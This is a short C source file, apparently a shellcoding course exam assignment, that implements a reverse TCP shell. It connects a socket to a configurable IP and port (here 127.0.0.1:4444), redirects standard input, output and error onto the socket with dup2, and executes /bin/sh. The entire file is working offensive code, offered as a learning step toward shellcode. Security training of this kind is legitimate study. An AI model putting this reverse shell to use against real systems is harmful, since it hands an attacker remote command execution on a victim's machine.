# SLAE Exam Assignment #2: Shell Reverse TCP Shellcode - C Version
# Author: Ray Doyle (@doylersec)
# Website: https://www.doyler.net

#include <stdio.h>
#include <netinet/in.h>

// Define the IP to connect to
#define IP "127.0.0.1"
// Define the port number to connect to
#define PORT 4444

int main(int argc, char **argv)
{
    // Create the socket (IPv4, TCP, and IP)
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

    // Configure the addr values for the connect() call
    struct sockaddr_in address;
    // IPv4
    address.sin_family = AF_INET;
    // Connect to 127.0.0.1
    address.sin_addr.s_addr = inet_addr(IP);
    // Use the defined port (htons is used to fix the byte order)
    address.sin_port = htons(PORT);

    printf("%i", sizeof(address));

    // Connect to the socket at the specified IP/port
    // http://man7.org/linux/man-pages/man2/connect.2.html
    connect(sock, (struct sockaddr *)&address, sizeof(address));

    // Duplicate the file descriptors for STDIN, STDOUT, and STDERR to the newly created socket
    // This functions as a redirect for all input and output over the listening socket, allowing interacting with the executed program
    // http://man7.org/linux/man-pages/man2/dup.2.html
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Execute /bin/sh with no arguments or environment strings
    execve("/bin/sh", NULL, NULL);

    return 0;
}